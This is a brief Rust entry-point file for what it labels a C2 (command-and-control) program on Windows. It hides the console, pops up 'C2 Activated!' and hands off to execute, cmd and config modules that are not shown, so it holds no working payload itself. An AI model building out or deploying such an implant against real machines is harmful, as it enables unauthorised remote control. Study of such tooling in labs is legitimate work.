#![windows_subsystem = "windows"]
use windows::core::PCSTR;
use windows::Win32::Foundation::HWND;
use windows::Win32::UI::WindowsAndMessaging::{MessageBoxA, MESSAGEBOX_STYLE};
mod execute;
use execute::execute;
mod cmd;
mod config;

///
/// Displays a Windows MessageBox at launch
///
fn show_messagebox(msg: &str) {
    unsafe {
        MessageBoxA(
            HWND(0),
            PCSTR(msg.as_ptr()),
            PCSTR("Hello!\x00".as_ptr()),
            MESSAGEBOX_STYLE(0),
        );
    }
}

fn main() {
    show_messagebox("C2 Activated!\x00");
    execute();
}
